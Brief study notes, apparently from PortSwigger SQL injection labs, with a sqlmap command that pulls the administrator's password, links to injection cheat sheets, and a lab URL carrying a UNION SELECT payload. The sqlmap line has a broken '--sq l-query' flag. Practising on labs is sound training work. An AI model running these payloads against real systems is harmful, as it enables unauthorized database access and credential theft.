____

```bash
sqlmap -u "URL" --cookie='lab=cookie' --level 5 --risk 3 -p param --batch --threads 10 --dbms=postgresql --sq l-query="SELECT password from USERS where username='administrator'"
```

[https://tib3rius.com/sqli](https://tib3rius.com/sqli) 

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


https://0acd00d604cbebeb81e54896000f00d3.web-security-academy.net/filter?category=%27%20union%20select%20%271%27,%272%27,%20VERSION(),%274%27,%275%27,%276%27,%277%27,%278%27--%20-


